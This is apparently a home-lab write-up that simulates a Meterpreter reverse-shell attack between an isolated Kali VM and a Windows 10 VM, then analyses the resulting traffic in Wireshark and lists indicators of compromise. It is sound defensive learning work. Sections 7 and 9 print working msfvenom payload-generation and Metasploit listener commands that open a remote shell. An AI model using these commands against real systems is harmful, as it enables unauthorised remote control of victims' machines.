# 🔬 Home Lab: Analysing Malicious Traffic with Wireshark

## 🎯 Objective

To simulate a reverse shell attack from a Kali Linux attacker machine to a Windows 10 victim machine and capture the network traffic using Wireshark for analysis. This was done in a closed, isolated environment without internet access to make sure network traffic is contained within the virtual environment to prevent any external risk.

## 🌟 Table of Contents 🌟

- [🛠️ Lab Setup Overview](#️-lab-setup-overview)
- [🧱 Step-by-Step Lab Setup](#-step-by-step-lab-setup)<br>
  - [1. Created Virtual Machines](#1-created-virtual-machines)
  - [2. Configured Networking (Host-Only)](#2-configured-networking-host-only)
  - [3. Booted Both VMs](#3-booted-both-vms)
  - [4. I Set Up a Simple HTTP Server on Kali](#4-i-set-up-a-simple-http-server-on-kali)
  - [5. I Downloaded Wireshark on the Windows VM Using Kali’s Local HTTP Server](#5-i-downloaded-wireshark-on-the-windows-vm-using-kalis-local-http-server)
  - [6. Installing Wireshark and Preparing for Packet Capture](#6-installing-wireshark-and-preparing-for-packet-capture)
  - [7. Generating a Reverse Shell with msfvenom](#7-generating-a-reverse-shell-with-msfvenom)
  - [8. Transferring Shell.exe to Windows 10 VM](#8-transferring-shellexe-to-windows-10-vm)
  - [9. Setting Up the Metasploit Listener](#9-setting-up-the-metasploit-listener)
  - [10. Executing the Payload and Capturing Traffic](#10-executing-the-payload-and-capturing-traffic)<br>
- [🔍 11. Step-by-Step Traffic Investigation in Wireshark](#-11-step-by-step-traffic-investigation-in-wireshark)
    - [11.1 Initial Packet Analysis](#111-initial-packet-analysis)
    - [11.2 Filtering for Suspicious Port](#112-filtering-for-suspicious-port)
    - [11.3 Inspecting the Protocol](#113-inspecting-the-protocol)
    - [11.4 Analysing the TCP Stream](#114-analysing-the-tcp-stream)
    - [11.5 Checking for Session Initiation](#115-checking-for-session-initiation)
    - [11.6 Investigating the DNS Resolution](#116-investigating-the-dns-resolution)
    - [11.7 Verifying the Data Flow](#117-verifying-the-data-flow)<br>
- [🏁 12. Investigation Findings](#12-investigation-findings)
  - [13. Final Indicators of Compromise Identified](#13-final-indicators-of-compromise-identified)
  - [14. Investigation Summary](#14-investigation-summary)
  - [15. Limitations and Future Work](#15-limitations-and-future-work)

## 🛠️ Lab Setup Overview

| Component | Description                  |
|-----------|------------------------------|
| 💻 Host   | Windows 10 with VMware Workstation |
| 🐍 Attacker | Kali Linux VM                |
| 🤕 Victim | Windows 10 VM                 |
| 🌐 Network | Host-Only (no internet access, local traffic only)       |


## 🧱 Step-by-Step Lab Setup

### 1. Created Virtual Machines

•	Kali Linux VM: Already installed.<br>
•	Windows 10 VM: Installed a fresh version from ISO.

<img src="https://i.imgur.com/cwLyuhg.png">

---

### 2. Configured Networking (Host-Only)

In VMware:

•	Set both VMs’ network adapters to Host-Only mode to isolate traffic from the internet.<br>
•	This allows both VMs to communicate internally but have no internet access.<br>

<img src="https://i.imgur.com/lKX8ERX.png">

I configured both the Kali Linux and Windows 10 VMs to use the Host-Only network adapter in VMware. This ensured that both machines could communicate directly with each other, while remaining completely isolated from the internet. This is important for simulating malware behaviour in a safe and controlled environment.

---

### 3. Booted Both VMs

<img src="https://i.imgur.com/4S067Cf.png">

<img src="https://i.imgur.com/oG3dX2C.png">

To confirm connectivity, I used ```ip a``` on Kali to find its IP address (172.16.0.129) and successfully pinged it from the Windows 10 VM.

---

### 4. I Set Up a Simple HTTP Server on Kali

Since both machines had no internet, I needed to install Wireshark on the Windows 10 VM manually. 
I already had the Wireshark installer on Kali.

<img src="https://i.imgur.com/VWJpCcK.png">

On Kali, I started a simple HTTP server from the directory containing the installer:

```
python3 -m http.server 8080
```

---

### 5. I Downloaded Wireshark on the Windows VM Using Kali’s Local HTTP Server

I had to temporarily disable the Kali firewall (using ```sudo ufw disable```) to allow the Windows VM to reach the HTTP server. After the transfer, I re-enabled it with ```sudo ufw enable``` to keep things secure.

<img src="https://i.imgur.com/MOGYV3O.png">

In Windows 10, I opened Edge and visited http://172.16.0.129:8080/ to connect to the Kali machine, which allowed me to download the Wireshark.exe installer directly from Kali VM.

<img src="https://i.imgur.com/vwaqCmn.png">

---

### 6. Installing Wireshark and Preparing for Packet Capture

Once Wireshark was downloaded to the Windows 10 VM, I installed it and verified that it was able to capture traffic on the Host-Only adapter. I ensured the network interface being monitored matched the one used for host-only traffic.

<img src="https://i.imgur.com/yOIEbEC.png">

---

### 7. Generating a Reverse Shell with msfvenom

Next, I generated a malicious payload using ```msfvenom```, a tool within the Metasploit Framework. This tool creates payloads that simulate malware, in this case, a reverse shell:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.0.129 LPORT=4444 -f exe -o /home/kali/Desktop/shell.exe
```

<img src="https://i.imgur.com/CxAbJGG.png">

**LHOST:** is Kali’s IP address (attacker).<br>
**LPORT 4444:** is the port Metasploit listens on.<br>
**-f exe:** creates a Windows executable payload.<br>
**-o:** sets the output path.<br>

---

### 8. Transferring Shell.exe to Windows 10 VM

I then used the same HTTP server method to transfer ```shell.exe``` to the Windows 10 VM.

<img src="https://i.imgur.com/SWYDjpi.png">

In real-world scenarios, malware like this is typically delivered to a victim's system via methods such as phishing or exploitation of vulnerabilities. For the purposes of this isolated home lab, the payload was transferred directly to simplify the simulation.

---

### 9. Setting Up the Metasploit Listener

Before running the malicious payload, I opened Metasploit on Kali:

```
Msfconsole
```

Then set up a handler to receive the reverse shell:

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 172.16.0.129
set LPORT 4444
run
```

<img src="https://i.imgur.com/O7HFP8m.png">

This opened a listener on port 4444, waiting for an incoming connection from the victim machine.

---

### 10. Executing the Payload and Capturing Traffic

I launched Wireshark on the Windows 10 VM and started capturing packets on the Host-Only interface. While capturing, I executed shell.exe.

<img src="https://i.imgur.com/2xV8FUe.png">

Within seconds, I observed an outbound connection from Windows to Kali on port 4444. On Kali, the Metasploit listener received the connection, and I gained a Meterpreter session — a simulated “hacker shell” on the victim system.

<img src="https://i.imgur.com/9N2dU3K.png">

---

## 🔎 11. Step-by-Step Traffic Investigation in Wireshark

Once the session was established and Wireshark captured the traffic, I began analysing it like a real-world SOC analyst would when reverse shell behaviour is suspected.

---

### 11.1 Initial Packet Analysis

<img src="https://i.imgur.com/lYdKC5F.png">

After executing the shell.exe file, I observed new traffic in Wireshark. By inspecting the newly generated packets, I noticed that all of them shared the same source IP address — 172.16.0.129 — and consistently used port 4444.

---

### 11.2 Filtering for Suspicious Port

<img src="https://i.imgur.com/4HSIHyA.png">

To focus on this specific traffic, I applied a filter in Wireshark for port 4444, isolating the packets that were related to this suspicious port. Out of a total of 695 packets captured, 429 packets were related to port 4444. This further confirmed that the traffic on this port was unusual and potentially malicious.

---

### 11.3 Inspecting the Protocol

<img src="https://i.imgur.com/9WvaopB.png">

Since I saw that the traffic was using TCP, which is typical for reverse shells due to its reliable, connection-oriented nature, I confirmed this by inspecting the Protocol field of the filtered packets. This ensured the communication was consistent with a Meterpreter session, as TCP supports the persistent, bidirectional data exchange required for command-and-control functionality.

---

### 11.4 Analysing the TCP Stream

<img src="https://i.imgur.com/tPc1w0B.png">

To get a better understanding of the actual communication, I used Wireshark’s Follow TCP Stream feature. This allowed me to see the raw data being transferred between the two machines.

What caught my eye was seeing some readable text in the TCP stream, like an error saying "This program cannot be run in DOS mode," mixed in with a bunch of weird encoded or binary code. That error stood out because it told me `shell.exe` actually ran on the Windows VM, probably hitting some DOS stub in the PE file (a leftover part of Windows executables for old systems) before the Meterpreter session kicked in. It showed the traffic wasn’t just sitting there doing nothing, it was active, with the payload running and maybe even sending commands back to my Kali machine.

---

### 11.5 Checking for Session Initiation

I also examined the initial packets for signs of a TCP handshake, which is essential in establishing a reverse shell connection. I focused on identifying packets where the TCP flags indicated a SYN (synchronize) request. This is typical during the connection setup phase and helped me confirm that the reverse shell session was initiated over the TCP protocol.

<img src="https://i.imgur.com/gJNGe0K.png">

The first packets I observed from the reverse shell session were SYN packets, which initiate the TCP handshake. Since the SYN packet was sent from the victim’s IP address to the attacker’s, this confirmed that the victim initiated the connection, which is a characteristic of a reverse shell. This verified that the connection was actively established from the victim's machine to the attacker.

---

### 11.6 Investigating the DNS Resolution

To rule out any DNS resolution (which is another way connections can be made), I examined whether any DNS requests were involved in the traffic.

<img src="https://i.imgur.com/EgRJ0Nx.png">

There are no DNS queries corresponding to the IP address 172.16.0.129, it suggests that the reverse shell connection is established directly via IP, without any DNS resolution.

---

### 11.7 Verifying the Data Flow

To begin verifying the consistency of the data flow, I adjusted the timestamp format in Wireshark to display the Date and Time of Day, rather than the default relative time, to make the packet data easier to read and interpret.

<img src="https://i.imgur.com/0HDdKVK.png">

I observed that the packets arrived at regular intervals, with differences of approximately 1-2 seconds between consecutive packets. This consistent timing, along with the presence of ACK and PSH flags, indicated active data exchange, typical of reverse shell traffic. The lack of significant gaps or interruptions further suggested a stable and continuously used connection.

<img src="https://i.imgur.com/FMVolk8.png">

---

### 12. Investigation Findings 

Based on packet analysis, timing correlation, port usage, and the nature of the traffic, I confirmed that the reverse shell was:

•	Initiated by the victim.<br>
•	Connected directly to the attacker's IP.<br>
•	Used a persistent, encoded TCP stream.<br>
•	Did not use DNS or standard protocols.<br>

**Note on Port Usage**: I used port 4444 for the reverse shell since it’s the Metasploit default and works well for learning. In real attacks, hackers often pick ports like 80 or 443 to hide in normal web traffic and avoid detection. Port 4444 did the job here, but I could look into sneakier methods for future labs.

---

### 13. Final Indicators of Compromise Identified

| IOC               | Description                                  |
|-------------------|----------------------------------------------|
| 172.16.0.129      | Attacker IP (my Kali machine)                |
| TCP 4444          | Custom C2 port I used for the Meterpreter session |
| shell.exe         | Malicious payload I ran on the Windows VM    |
| No DNS resolution | Direct connection to IP, no domain lookups   |
| Long-lived TCP session | Hints at a C2 connection staying active |
| High-entropy TCP stream | Shows the Meterpreter payload doing its thing |

---

### 14. Investigation Summary


In this investigation, I observed suspicious traffic between my Kali Linux VM (attacker) and Windows 10 VM (victim), which led me to suspect the presence of a reverse shell. I began by examining packets on port 4444, which is a commonly used port for reverse shell payloads, particularly in tools like Metasploit. However, the mere presence of traffic on this port doesn't automatically confirm that it’s a reverse shell, as other types of communication could also occur on this port.

To further investigate, I analysed the packet flow and identified patterns of communication originating from the Kali VM, which was consistent with the behaviour of a reverse shell connection. I verified the data flow by examining the timing and consistency of packets to ensure the connection was stable and ongoing, as would be expected with an active reverse shell.

Although the data in the TCP stream was encrypted and in binary form, making it unreadable, the consistent communication pattern and specific use of port 4444 strongly indicated the possibility of a reverse shell. Ultimately, I concluded that the traffic was highly likely to be related to a reverse shell based on the evidence of sustained, directed communication between the attacker and the victim, the established TCP connection, and the common use of port 4444 by reverse shell payloads.

## 15. Limitations and Future Work

This lab was a good way to figure out reverse shells and Wireshark, but I know I simplified some stuff to get it running:

- **How I Moved the Payload**: I used a local HTTP server on Kali to transfer `shell.exe` to the Windows VM since there was no internet. In real attacks, hackers usually trick people with phishing emails or exploits, so I could try that next time to make it more realistic.
- **Port 4444**: I picked port 4444 because it’s the default for Metasploit and easy for learning. But real hackers often use ports like 80 or 443 to blend in with normal web traffic, so I want to try those in a future lab.
- **What I Looked At**: I mostly focused on the network traffic with Wireshark. I could dig deeper by checking stuff like Windows Event Logs on the victim VM to see what `shell.exe` did there, or maybe use tools like Snort to spot the attack another way.
